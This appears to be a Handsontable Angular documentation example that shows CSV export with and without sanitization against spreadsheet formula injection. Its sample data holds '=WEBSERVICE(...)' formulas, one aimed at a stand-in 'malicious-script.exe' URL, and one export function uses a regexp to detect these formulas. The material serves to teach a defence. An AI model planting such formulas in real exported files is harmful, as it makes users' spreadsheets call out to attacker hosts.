/* file: app.component.ts */
import { Component, ViewChild, ViewEncapsulation } from '@angular/core';
import { GridSettings, HotTableComponent, HotTableModule } from '@handsontable/angular-wrapper';

@Component({
  selector: 'app-example4',
  standalone: true,
  imports: [HotTableModule],
  template: `
    <div class="example-controls-container">
      <div class="controls">
        <button (click)="downloadCSVWithNoSanitization()">Download CSV with no sanitization</button>
        <button (click)="downloadCSVWithRecommendedSanitization()">Download CSV with recommended sanitization</button>
        <button (click)="downloadCSVWithRegexpSanitization()">Download CSV with sanitization using a regexp</button>
        <button (click)="downloadCSVWithFunctionSanitization()">Download CSV with sanitization using a function</button>
      </div>
    </div>

    <hot-table
      [settings]="hotSettings!" [data]="hotData">
    </hot-table>
  `,
  encapsulation: ViewEncapsulation.None
})
export class AppComponent {
  @ViewChild(HotTableComponent, {static: false}) hotTable!: HotTableComponent;

  readonly hotData = [
    ['https://handsontable.com', '=WEBSERVICE(A1)'],
    ['https://github.com', '=WEBSERVICE(A2)'],
    ['http://example.com/malicious-script.exe', '=WEBSERVICE(A3)'],
  ];

  readonly hotSettings: GridSettings = {
    colHeaders: true,
    rowHeaders: true,
    height: 'auto',
    autoWrapRow: true,
    autoWrapCol: true,
  };

  downloadCSVWithNoSanitization() {
    const exportPlugin = this.hotTable.hotInstance!.getPlugin('exportFile');

    exportPlugin.downloadFile('csv', {
      bom: false,
      columnDelimiter: ',',
      colHeaders: false,
      exportHiddenColumns: true,
      exportHiddenRows: true,
      fileExtension: 'csv',
      filename: 'Handsontable-CSV-file_[YYYY]-[MM]-[DD]',
      mimeType: 'text/csv',
      rowDelimiter: '\r\n',
    });
  }

  downloadCSVWithRecommendedSanitization() {
    const exportPlugin = this.hotTable.hotInstance!.getPlugin('exportFile');

    exportPlugin.downloadFile('csv', {
      bom: false,
      columnDelimiter: ',',
      colHeaders: false,
      exportHiddenColumns: true,
      exportHiddenRows: true,
      fileExtension: 'csv',
      filename: 'Handsontable-CSV-file_[YYYY]-[MM]-[DD]',
      mimeType: 'text/csv',
      rowDelimiter: '\r\n',
      sanitizeValues: true,
    });
  }

  downloadCSVWithRegexpSanitization() {
    const exportPlugin = this.hotTable.hotInstance!.getPlugin('exportFile');

    exportPlugin.downloadFile('csv', {
      bom: false,
      columnDelimiter: ',',
      colHeaders: false,
      exportHiddenColumns: true,
      exportHiddenRows: true,
      fileExtension: 'csv',
      filename: 'Handsontable-CSV-file_[YYYY]-[MM]-[DD]',
      mimeType: 'text/csv',
      rowDelimiter: '\r\n',
      sanitizeValues: /WEBSERVICE/,
    });
  }

  downloadCSVWithFunctionSanitization() {
    const exportPlugin = this.hotTable.hotInstance!.getPlugin('exportFile');

    exportPlugin.downloadFile('csv', {
      bom: false,
      columnDelimiter: ',',
      colHeaders: false,
      exportHiddenColumns: true,
      exportHiddenRows: true,
      fileExtension: 'csv',
      filename: 'Handsontable-CSV-file_[YYYY]-[MM]-[DD]',
      mimeType: 'text/csv',
      rowDelimiter: '\r\n',
      sanitizeValues: (value: string) => {
        return /WEBSERVICE/.test(value) ? 'REMOVED SUSPICIOUS CELL CONTENT' : value;
      },
    });
  }
}
/* end-file */

/* file: app.config.ts */
import { ApplicationConfig, provideZoneChangeDetection } from '@angular/core';
import { registerAllModules } from 'handsontable/registry';
import { HOT_GLOBAL_CONFIG, HotGlobalConfig, NON_COMMERCIAL_LICENSE } from '@handsontable/angular-wrapper';

registerAllModules();

export const appConfig: ApplicationConfig = {
  providers: [
    provideZoneChangeDetection({ eventCoalescing: true }),
    {
      provide: HOT_GLOBAL_CONFIG,
      useValue: {
        license: NON_COMMERCIAL_LICENSE,
      } as HotGlobalConfig,
    },
  ],
};
/* end-file */
